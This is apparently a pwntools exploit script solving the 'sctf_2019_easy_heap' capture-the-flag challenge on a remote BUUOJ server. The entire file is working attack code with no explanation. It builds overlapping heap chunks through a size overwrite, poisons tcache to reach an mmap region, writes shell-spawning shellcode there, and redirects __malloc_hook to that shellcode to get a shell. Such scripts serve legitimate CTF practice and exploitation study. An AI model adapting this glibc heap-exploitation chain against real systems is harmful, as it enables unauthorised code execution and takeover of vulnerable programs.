from pwn import *

context.arch = 'amd64'

#p = process('./sctf_2019_easy_heap')
p = remote('node4.buuoj.cn', 28804)
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size):
    sla(b'>> ', b'1')
    sla(b'Size: ', str(size).encode())

def delete(index):
    sla(b'>> ', b'2')
    sla(b'Index: ', str(index).encode())

def edit(index, content):
    sla(b'>> ', b'3')
    sla(b'Index: ', str(index).encode())
    sa(b'Content: ', content)

ru(b': ')
mmap = int(ru(b'000'), 16)
success('mmap -> {}'.format(hex(mmap)))

alloc(0x410) #0
alloc(0x78)  #1
alloc(0x88)  #2
alloc(0x4f0) #3
alloc(0x90)  #4

delete(0)
edit(2, b'a' * 0x80 + p64(0x530))
delete(3)

alloc(0x410) #0
delete(2)
alloc(0x78) #chunk2 = chunk1
delete(2)
delete(1)
alloc(0x78) #1
edit(1, p64(mmap) + b'\n')
alloc(0x78) #2
alloc(0x78) #3
shellcode = asm(shellcraft.sh(), os = 'linux')
edit(3, shellcode + b'\n')

alloc(0x38) #5
edit(5, bytearray([libc.sym['__malloc_hook'] & 0xff]) + b'\n')

alloc(0x88) #6
alloc(0x88) #7
edit(7, p64(mmap) + b'\n')

alloc(0x20) #getshell

p.interactive()